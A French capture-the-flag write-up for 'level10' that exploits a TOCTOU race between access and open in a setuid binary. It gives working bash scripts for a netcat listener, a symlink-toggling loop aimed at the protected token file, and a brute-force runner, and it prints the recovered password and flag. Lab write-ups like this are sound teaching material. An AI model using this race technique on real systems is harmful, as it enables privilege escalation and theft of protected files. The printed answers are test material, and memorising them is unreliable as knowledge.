# Level 10

## Étapes pour résoudre le challenge

### 1. Introduction

Dans ce niveau, nous avons un exécutable `level10` et un fichier `token`. L'objectif est d'exploiter une vulnérabilité de type TOCTOU (Time Of Check to Time Of Use) pour accéder au contenu du fichier `token`.

L'exécutable `level10` prend deux arguments : un fichier et un hôte. Il vérifie si l'utilisateur a accès au fichier, se connecte à l'hôte sur le port 6969, et envoie le contenu du fichier à l'hôte.

L'exécutable `level10` utilise la fonction `access` pour vérifier les permissions de lecture sur le fichier avant de l'ouvrir. Cela crée une fenêtre de temps où un attaquant peut remplacer le fichier vérifié par un autre fichier (dans ce cas, le fichier `token`).

Nous allons exploiter cette fenêtre de temps en utilisant un lien symbolique qui alterne rapidement entre l'exécutable `level10` et le fichier `token`. En exécutant l'exécutable `level10` en boucle, nous pourrons éventuellement contourner la vérification de permission et obtenir le contenu du fichier `token`.

### 2. Préparation

#### 2.1. Écouter sur le port 6969

Créez un script `start_telnet_server.sh` pour écouter sur le port 6969 :

```bash
#!/bin/bash
# Telnet server

start_telnet_server()
{
    while true; do
        nc -l 6969
    done
}
start_telnet_server
```

Rendez le script exécutable et lancez-le :

```bash
chmod +x start_telnet_server.sh
./start_telnet_server.sh
```

#### 2.2. Créer une boucle pour alterner le lien symbolique

Créez un script `toggle_symlink.sh` pour créer une boucle qui alterne le lien symbolique entre `level10` et `token` :

```bash
#!/bin/bash
# Script to exploit a race condition between access & open.

while true; do
	ln -sf /tmp/fake_tok /tmp/tok ;
	ln -sf /home/user/level10/token /tmp/tok ;
done
```

Rendez le script exécutable et lancez-le dans un deuxième terminal :

```bash
chmod +x toggle_symlink.sh
./toggle_symlink.sh
```

#### 2.3. Exécuter `level10` en boucle

Créez un script `brute_force.sh` pour exécuter `level10` en boucle :

```bash
#!/bin/bash
# Random Brute force

while true; do
	/home/user/level10/level10 /tmp/tok 127.0.0.1 ;
done
```

Rendez le script exécutable et lancez-le dans un troisième terminal :

```bash
chmod +x brute_force.sh
./brute_force.sh
```

### 3. Identifier le mot de passe

En exécutant les commandes ci-dessus sur trois terminaux différents, vous pourrez voir apparaître le contenu du fichier `token` dans le premier terminal (celui écoutant sur le port 6969).

**Sortie attendue :**

```plaintext
woupa2yuojeeaaed06riuj63c
```

### 4. Connexion avec le mot de passe

Utilisez le mot de passe trouvé pour vous connecter en tant que `flag10` :

```bash
su flag10
password : woupa2yuojeeaaed06riuj63c
```

### 5. Obtenir le flag

Une fois connecté en tant que `flag10`, exécutez la commande `getflag` pour obtenir le flag.

```bash
getflag
```

**Sortie attendue :**

```plaintext
feulo4b72j7edeahuete3no7c
```

## Résumé

Pour résoudre ce challenge, nous avons exploité une vulnérabilité de type TOCTOU en utilisant un lien symbolique qui alterne rapidement entre l'exécutable `level10` et le fichier `token`. Cela nous a permis de contourner la vérification des permissions et d'obtenir le contenu du fichier `token`.

Le flag pour `level10` est : `feulo4b72j7edeahuete3no7c`.